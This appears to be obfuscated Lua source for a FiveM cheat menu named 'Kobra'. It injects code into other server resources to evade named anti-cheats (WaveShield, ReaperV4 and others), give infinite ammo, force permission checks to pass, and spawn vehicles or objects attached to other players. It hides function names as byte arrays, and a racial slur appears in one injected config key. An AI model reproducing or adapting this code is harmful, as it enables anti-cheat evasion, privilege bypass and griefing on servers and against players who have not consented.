v1254(...);end);hNative("SetTextProportional",function(v1255,...) return v1255(...);end);hNative("SetTextScale",function(v1256,...) return v1256(...);end);hNative("SetTextDropShadow",function(v1257,...) return v1257(...);end);v1006=2 + 1 ;end if (v1006==0) then _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v1258,v1259) local v1260=0 -0 ;local v1261;while true do if (v1260==(0 + 0)) then v1261=_G[v1258];if ( not v1261 or (type(v1261)~="function")) then return;end v1260=2 -1 ;end if ((2 -1)==v1260) then _G[v1258]=function(...) return v1259(v1261,...);end;break;end end end hNative("CreateThread",function(v1262,...) return v1262(...);end);hNative("Wait",function(v1263,...) return v1263(...);end);hNative("IsVehicleSeatFree",function(v1264,...) return v1264(...);end);v1006=1;end end else v48(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                    _G.KobraFreecamEnabled = false
                    _G.KobraFreecamThreadRunning = false

                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                    hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                    hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                    hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                    hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                    RenderScriptCams(false, false, 0, true, true)
                    if _G.KobraFreecamObject then DestroyCam(_G.KobraFreecamObject, false) _G.KobraFreecamObject = nil end
                    SetFocusEntity(PlayerPedId())
                ]]);end else _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v924,v925) local v926=433 -(279 + 154) ;local v927;while true do if (v926==(779 -(454 + 324))) then _G[v924]=function(...) return v925(v927,...);end;break;end if (0==v926) then v927=_G[v924];if ( not v927 or (type(v927)~="function")) then return;end v926=1;end end end hNative("CreateThread",function(v928,...) return v928(...);end);hNative("Wait",function(v929,...) return v929(...);end);hNative("IsVehicleSeatFree",function(v930,...) return v930(...);end);hNative("PlayerPedId",function(v931,...) return v931(...);end);hNative("GetEntityCoords",function(v932,...) return v932(...);end);hNative("CreateCam",function(v933,...) return v933(...);end);hNative("SetCamCoord",function(v934,...) return v934(...);end);hNative("SetCamRot",function(v935,...) return v935(...);end);hNative("RenderScriptCams",function(v936,...) return v936(...);end);hNative("DestroyCam",function(v937,...) return v937(...);end);hNative("SetFocusEntity",function(v938,...) return v938(...);end);hNative("SetTextFont",function(v939,...) return v939(...);end);hNative("SetTextProportional",function(v940,...) return v940(...);end);hNative("SetTextScale",function(v941,...) return v941(...);end);hNative("SetTextDropShadow",function(v942,...) return v942(...);end);hNative("SetTextEdge",function(v943,...) return v943(...);end);hNative("SetTextOutline",function(v944,...) return v944(...);end);hNative("SetTextCentre",function(v945,...) return v945(...);end);hNative("SetTextColour",function(v946,...) return v946(...);end);hNative("BeginTextCommandDisplayText",function(v947,...) return v947(...);end);hNative("AddTextComponentSubstringPlayerName",function(v948,...) return v948(...);end);hNative("EndTextCommandDisplayText",function(v949,...) return v949(...);end);hNative("GetCamCoord",function(v950,...) return v950(...);end);hNative("GetCamRot",function(v951,...) return v951(...);end);hNative("IsControlPressed",function(v952,...) return v952(...);end);hNative("GetDisabledControlNormal",function(v953,...) return v953(...);end);hNative("TaskStandStill",function(v954,...) return v954(...);end);hNative("SetFocusPosAndVel",function(v955,...) return v955(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v956,...) return v956(...);end);hNative("GetShapeTestResult",function(v957,...) return v957(...);end);hNative("IsControlJustPressed",function(v958,...) return v958(...);end);hNative("IsDisabledControlJustPressed",function(v959,...) return v959(...);end);hNative("IsEntityAVehicle",function(v960,...) return v960(...);end);hNative("TaskWarpPedIntoVehicle",function(v961,...) return v961(...);end);hNative("SetEntityCoords",function(v962,...) return v962(...);end);hNative("GiveWeaponToPed",function(v963,...) return v963(...);end);hNative("SetCurrentPedWeapon",function(v964,...) return v964(...);end);hNative("ShootSingleBulletBetweenCoords",function(v965,...) return v965(...);end);RenderScriptCams(false,false,0,true,true);if _G.KobraFreecamObject then local v1007=0 + 0 ;while true do if (v1007==(17 -(12 + 5))) then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;break;end end end SetFocusEntity(PlayerPedId());end break;end if ((0 + 0)==v535) then v32=false;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=false}));v535=2 -1 ;end end end end;v12.EnableInfiniteAmmo=function(v191) if (GetResourceState("WaveShield")=="started") then print("1");local function v536(v605) local v606=0 + 0 ;local v607;while true do if (v606==(1093 -(277 + 816))) then v607="";for v868=4 -3 , #v605 do v607=v607   .. string.char(v605[v868]) ;end v606=1;end if (v606==1) then return v607;end end end local function v537(v608) return _G[v536(v608)];end if  not _G.osintInfAmmo then _G.osintInfAmmo={enabled=false};end _G.osintInfAmmo.enabled=true;local v538=v537({15 + 65 ,108,1072 -(815 + 160) ,519 -398 ,239 -138 ,333 -219 ,1978 -(41 + 1857) ,101,143 -43 ,73,1874 -(1111 + 663) });local v539=v537({10 + 61 ,209 -108 ,795 -(642 + 37) ,83,17 + 84 ,108,101,99,103 + 13 ,64 + 37 ,283 -183 ,189 -109 ,81 + 20 ,100,229 -142 ,1288 -(1151 + 36) ,26 + 71 ,334 -222 ,945 -(64 + 770) ,110});local v540=v537({71,18 + 83 ,116,72,148 -51 ,934 -(599 + 220) ,2035 -(1813 + 118) ,55 + 20 ,141 -40 ,330 -209 });local v541=v537({71,960 -(464 + 395) ,56 + 60 ,65,946 -(467 + 370) ,81 + 28 ,18 + 93 ,593 -(150 + 370) ,270 -160 ,379 -299 ,491 -(14 + 376) ,100,87,89 + 12 ,97,112,111,188 -(23 + 55) });local v542=v537({154 -89 ,90 + 10 ,155 -55 ,966 -(652 + 249) ,291 -182 ,109,202 -91 ,19 + 65 ,1843 -(1400 + 332) ,80,44 + 57 ,86 + 14 });local v543=v537({118 -50 ,111,90 + 11 ,115,1730 -(909 + 752) ,110,116,41 + 64 ,116,363 -(6 + 236) ,44 + 25 ,283 -163 ,1238 -(1076 + 57) ,19 + 96 ,116});local v544=v537({87,86 + 11 ,105,116});local v545={};local function v546(v609) local v610=407 -(174 + 233) ;local v611;local v612;while true do if (v610==(0 -0)) then v611=coroutine.create(v609);v612=nil;v610=1 -0 ;end if (v610==(1 + 0)) then function v612() while coroutine.status(v611)~="dead"  do local v966,v967=coroutine.resume(v611);if  not v966 then print("^1[Kobra InfAmmo] Coroutine error: ^7",v967);break;end v544(1174 -(663 + 511) );end end v612();break;end end end if  not _G.osintWaveLoop then _G.osintWaveLoop=true;v546(function() while _G.osintWaveLoop do if _G.osintInfAmmo.enabled then local v968=v538();if v543(v968) then local v1076=v539(v968);if (v1076 and (v1076~=v540("WEAPON_UNARMED"))) then local v1180=0 + 0 ;local v1181;local v1182;local v1183;while true do if (v1180==(0 + 0)) then v1181,v1182=v541(v968,v1076);v1183=tostring(v968);v1180=2 -1 ;end if (v1180==(1 + 0)) then if  not v545[v1183] then v545[v1183]=v1182;end if (v1182<v545[v1183]) then v542(v968,v1076,v545[v1183] -v1182 );end break;end end end end else coroutine.yield();end coroutine.yield();end end);end elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);end end;v12.DisableInfiniteAmmo=function(v192) if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            if _G.osintInfAmmo then
                _G.osintInfAmmo.enabled = false
            end
        ]]);elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);end end;v12.AttachSelectedVehicle=function(v193,v194,v195) if ( not v194 or ( #v194==(0 -0))) then local v547=0 -0 ;while true do if (v547==0) then v193:Notify("error","Kobra","No players selected!",3000);return;end end end if ( not v195 or ( #v195==(0 + 0))) then v193:Notify("error","Kobra","Invalid vehicle model!",5839 -2839 );return;end local function v196(v319) local v320=0 + 0 ;local v321;while true do if (v320==(0 + 0)) then v321={};for v764=1, #v319 do v321[v764]=string.byte(v319,v764);end v320=1;end if (v320==1) then return table.concat(v321,",");end end end local v197=v195;local v198=v196(v197);local v199=GetCurrentServerEndpoint();local v200=722 -(478 + 244) ;for v322,v323 in ipairs(v194) do if (GetResourceState("solos-rentals")=="started") then print("[vehicle_attach] Fallback: solos-rentals");local v613,v614=pcall(function() MachoInjectResource("solos-rentals",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    config.locations["customnigga"] = {
                        vehiclespawncoords = vec4(coords.x, coords.y, coords.z, heading)
                    }
                    TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga", function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v198,v323));end);if v613 then v200=v200 + (518 -(440 + 77)) ;end elseif (GetResourceState("amigo")=="started") then print("[vehicle_attach] Fallback: Amigo RP");local v766,v767=pcall(function() MachoInjectResourceRaw("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v198,v323));end);if v766 then v200=v200 + 1 + 0 ;end elseif (GetResourceState("qb-core")=="started") then print("[vehicle_attach] Fallback #02");local v869,v870=pcall(function() MachoInjectResource("qb-core",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    QBCore.Functions.SpawnVehicle(model, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end, coords, true, true)
                ]],v198,v323));end);if v869 then v200=v200 + (3 -2) ;end elseif ((v199:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then local v1008=0;local v1009;local v1010;while true do if (0==v1008) then print("[vehicle_attach] Fallback #1");v1009,v1010=pcall(function() MachoInjectResource("drc_gardener",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    SpawnVehicleAndWarpPlayer(model, coords)
                ]],v198,v323));end);v1008=1;end if (v1008==1) then if v1009 then v200=v200 + (1557 -(655 + 901)) ;end break;end end elseif (GetResourceState("lunar_bridge")=="started") then local v1097=0 + 0 ;local v1098;local v1099;while true do if (v1097==(0 + 0)) then print("[vehicle_attach] Fallback #2");v1098,v1099=pcall(function() MachoInjectResourceRaw("lunar_bridge",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    Framework.spawnVehicle(model, coords, heading, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            SetVehicleOnGroundProperly(vehicle)
                            Citizen.Wait(500)
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v198,v323));end);v1097=1 + 0 ;end if ((3 -2)==v1097) then if v1098 then v200=v200 + (1446 -(695 + 750)) ;end break;end end elseif (GetResourceState("lation_laundering")=="started") then print("[vehicle_attach] Fallback #3");local v1265,v1266=pcall(function() MachoInjectResourceRaw("lation_laundering",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local position = vector4(coords.x, coords.y, coords.z + 0.5, heading)
                    local vehicle = SpawnVehicle(model, position)
                    if vehicle and DoesEntityExist(vehicle) then
                        SetVehicleOnGroundProperly(vehicle)
                        Citizen.Wait(500)
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        ShowNotification("~g~Vehicle attached successfully!")
                    end
                ]],v198,v323));end);if v1265 then v200=v200 + (3 -2) ;end else local v1267=0 -0 ;local v1268;local v1269;while true do if (v1267==(3 -2)) then if v1268 then v200=v200 + (352 -(285 + 66)) ;end break;end if (v1267==0) then print("[vehicle_attach] Universal Fallback");v1268,v1269=pcall(function() local v1385=0 -0 ;local v1386;while true do if ((1310 -(682 + 628))==v1385) then v1386=string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    RequestModel(model)
                    local maxAttempts = 20
                    local attempts = 0
                    while not HasModelLoaded(model) and attempts < maxAttempts do
                        Citizen.Wait(500)
                        attempts = attempts + 1
                    end
                    if attempts >= maxAttempts then return end
                    
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local vehicle = CreateVehicle(model, coords.x, coords.y, coords.z, heading, true, true)
                    if vehicle and DoesEntityExist(vehicle) then
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        SetModelAsNoLongerNeeded(model)
                    end
                ]],v198,v323);MachoInjectResourceRaw("any",v1386,v323);break;end end end);v1267=1 + 0 ;end end end end end;function encodeToByteArrayLiteral(v201) if  not v201 then return "";end if (type(v201)~="string") then return tostring(v201);end if ( #v201==(299 -(176 + 123))) then return "";end local v202={};for v324=1 + 0 , #v201 do v202[ #v202 + 1 ]=tostring(string.byte(v201,v324));end return table.concat(v202,", ");end v12.SpawnSelectedObject=function(v203,v204) if ( not v204 or ( #v204==(0 + 0))) then v203:Notify("error","Kobra","No players selected!",3000);return;end local v205=v203:GetSelectedObjectModel();if ( not v205 or ( #v205==0)) then local v548=269 -(239 + 30) ;while true do if (v548==0) then v203:Notify("error","Kobra","Invalid object model!",816 + 2184 );return;end end end local v206=encodeToByteArrayLiteral(v205);local v207=0 + 0 ;for v326,v327 in ipairs(v204) do if ((GetResourceState("qb-core")=="started") or ((GetResourceState("mc9-core")=="started") and ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started") or (GetResourceState("ReaperV4")=="started") or (GetResourceState("WaveShield")=="started")))) then local v615=0 -0 ;while true do if (0==v615) then v203:Notify("error","Kobra","Using Qb-core Spawner!",3000);MachoInjectResource("qb-core",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and joaat(model) or model
                QBCore.Functions.LoadModel(hash)
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]],v206,v327));v615=1;end if ((2 -1)==v615) then v207=v207 + (316 -(306 + 9)) ;break;end end elseif (GetResourceState("cd_dispatch")=="started") then print("using fallback");MachoInjectResource("cd_dispatch",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                
                -- Hook CreateObject to override hash and ensure model loading
                local originalCreateObject = CreateObject
                CreateObject = function(objHash, x, y, z, dynamic, placeOnGround, p7)
                    if type(objHash) == 'number' and objHash ~= hash then
                        -- Override with our custom hash for this spawn
                        objHash = hash
                    end
                    RequestModel(objHash)
                    while not HasModelLoaded(objHash) do
                        Citizen.Wait(0)
                    end
                    local obj = originalCreateObject(objHash, x, y, z, dynamic, placeOnGround, p7)
                    SetModelAsNoLongerNeeded(objHash)
                    return obj
                end
                
                -- Spawn the object on target player
                local player = GetPlayerFromServerId(%d)
                if player == -1 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                end
                
                -- Restore original CreateObject
                CreateObject = originalCreateObject
            ]],v206,v327));v207=v207 + (3 -2) ;elseif (GetResourceState("rcore_drunk")=="started") then MachoInjectResourceRaw("rcore_drunk",string.format([[
                local model = "%s"
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local hash = GetHashKey(model)
                RequestModel(hash)
                while not HasModelLoaded(hash) do Citizen.Wait(0) end
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
            ]],v205,v327));v207=v207 + 1 + 0 ;elseif (GetResourceState("lc_fuel")=="started") then MachoInjectResourceRaw("lc_fuel",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    Config.NozzleProps.gas = model
                    local entity = createFuelNozzleObject()
                    SetEntityCoords(entity, coords)
                end
                spawnObj()
            ]],v205,v327));v207=v207 + 1 + 0 ;elseif (GetResourceState("0r-illegalpack")=="started") then local v1100=0 + 0 ;while true do if (v1100==(0 -0)) then MachoInjectResourceRaw("0r-illegalpack",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local entity = Utils.createObject(model, coords, vec3(0.0, 0.0, 0.0), true, true, false)
                end
                spawnObj()
            ]],v205,v327));v207=v207 + 1 ;break;end end elseif (GetResourceState("xradio")=="started") then local v1270=1375 -(1140 + 235) ;while true do if (v1270==(0 + 0)) then MachoInjectResourceRaw("xradio",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    CreateRadioObject(model, coords, function(entity)
                        print(entity)
                    end)
                end
                spawnObj()
            ]],v205,v327));v207=v207 + 1 + 0 ;break;end end else MachoInjectResourceRaw("any",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                RequestModel(hash)
                local attempts = 0
                while not HasModelLoaded(hash) and attempts < 20 do
                    Citizen.Wait(100)
                    attempts = attempts + 1
                end
                if attempts >= 20 then return end
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]],v206,v327));v207=v207 + 1 ;end end v203:Notify("success","Kobra",string.format("Object '%s' spawned on %d/%d player(s)!",v205,v207, #v204),5000);end;v12.HandleSpectateToggle=function(v208,v209,v210) local v211=0 + 0 ;local v212;local v213;while true do if (v211==(53 -(33 + 19))) then if  not v212 then local v768=0;while true do if (v768==0) then v208:Notify("error","Kobra","Invalid server ID format!",1084 + 1916 );return;end end end if (v212==tonumber(GetPlayerServerId(PlayerId()))) then v208:Notify("error","Kobra","You cannot spectate yourself!",8991 -5991 );return;end v211=2;end if (v211==(2 + 1)) then if v213 then print("Spectate Fallback #3 (ReaperV4 detected, running direct)");if  not GetPlayerName(GetPlayerFromServerId(v212)) then v208:Notify("error","Kobra","Target player not found!",3000);print("[ReaperV4 Spectate] Error: No player found for server ID:",v212);return;end local v769=string.format([[
            local function HookNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    print("[ReaperV4 Spectate] Warning: Native " .. nativeName .. " not found or not a function")
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
